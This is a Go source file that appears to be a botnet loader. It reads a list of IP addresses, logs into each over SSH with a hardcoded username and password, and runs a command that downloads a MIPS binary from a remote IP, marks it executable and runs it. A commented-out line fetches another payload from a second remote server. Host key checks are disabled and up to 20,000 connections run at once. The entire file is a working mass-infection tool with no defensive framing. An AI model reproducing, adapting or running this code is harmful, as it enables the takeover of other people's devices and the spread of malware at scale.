package main

import (
	"bufio"
	"bytes"
	"fmt"
	"log"
	"net"
	"os"
	"sync"
	"time"

	"golang.org/x/crypto/ssh"
)

func main() {
	ips, err := readIPs("open.txt")
	if err != nil {
		log.Fatal(err)
	}

	var wg sync.WaitGroup
	sem := make(chan struct{}, 20000) // use a channel as a semaphore to limit the number of goroutines

	for _, ip := range ips {
		sem <- struct{}{} // acquire semaphore
		wg.Add(1)
		go func(ip string) {
			defer wg.Done()
			defer func() { <-sem }() // release semaphore
			//cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://185.106.94.171:8000/ssh; curl -O http://185.106.94.171:8000/ssh
			output, err := runCommand(ip, "ubnt", "meowmeowgang", "cd /tmp; rm -rf mips; wget http://103.136.42.94/x01/mips; chmod +x mips; ./mips")
			if err != nil {
				log.Printf("Failed to run command on %s: %v", ip, err)
				return
			}
			fmt.Printf("Output from %s:\n%s\n", ip, output)
		}(ip)
	}

	wg.Wait()
}

func readIPs(filename string) ([]string, error) {
	f, err := os.Open(filename)
	if err != nil {
		return nil, err
	}
	defer f.Close()

	var ips []string
	scanner := bufio.NewScanner(f)
	for scanner.Scan() {
		line := scanner.Text()
		ip := net.ParseIP(line)
		if ip != nil {
			ips = append(ips, ip.String())
		}
	}

	if err := scanner.Err(); err != nil {
		return nil, err
	}

	return ips, nil
}

func runCommand(ip, user, password, command string) (string, error) {
	config := &ssh.ClientConfig{
		User: user,
		Auth: []ssh.AuthMethod{
			ssh.Password(password),
		},
		Timeout: time.Second * 10,
		HostKeyCallback: func(hostname string, remote net.Addr, key ssh.PublicKey) error {
			return nil
		},
	}

	client, err := ssh.Dial("tcp", ip+":22", config)
	if err != nil {
		return "", fmt.Errorf("Failed to dial: %v", err)
	}
	defer client.Close()

	session, err := client.NewSession()
	if err != nil {
		return "", fmt.Errorf("Failed to create session: %v", err)
	}
	defer session.Close()

	var output bytes.Buffer
	session.Stdout = &output
	err = session.Run(command)
	if err != nil {
		return "", fmt.Errorf("Failed to run command: %v", err)
	}

	return output.String(), nil
}
